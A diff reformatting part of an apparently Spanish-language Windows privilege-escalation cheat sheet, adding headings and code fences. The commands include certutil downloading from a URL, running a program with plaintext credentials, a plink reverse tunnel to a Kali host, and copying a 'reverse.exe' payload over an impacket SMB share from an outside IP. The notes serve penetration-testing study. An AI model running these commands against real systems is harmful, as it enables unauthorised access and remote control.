@@ -98,19 +98,17 @@ certutil.exe -urlcache -f <URL> <OUTPUT_FILE>
 accesschk.exe /accepteula -quvw <user> <Ruta absoluta del archivo>
 ```
 ### Ejecución de un programa como otro usuario en Powershell[](#ejecucion-de-un-programa-como-otro-usuario-en-powershell)
+
 ```python
 powershell -c "$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<USER>', $password);Start-Process -FilePath "<PROGRAM.EXE>" -Credential $creds"
 ```
-#### 
+### Windows Port Forwarding[](#windows-port-forwarding)
 
-Windows Port Forwarding[](#windows-port-forwarding)
-
+```python
 plink.exe -l <KALI_USER> -pw <KALI_USER_PASS> -R <KALI_PORT>:<LOCAL_IP/LOCALHOST_IP>:<LOCAL_PORT> <KALI_IP>
-
-#### 
-
-Transferencia de archivos mediante smb[](#transferencia-de-archivos-mediante-smb)
-
+```
+### Transferencia de archivos mediante smb[](#transferencia-de-archivos-mediante-smb)
+```python
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . #Kali
 
 copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe #Windows
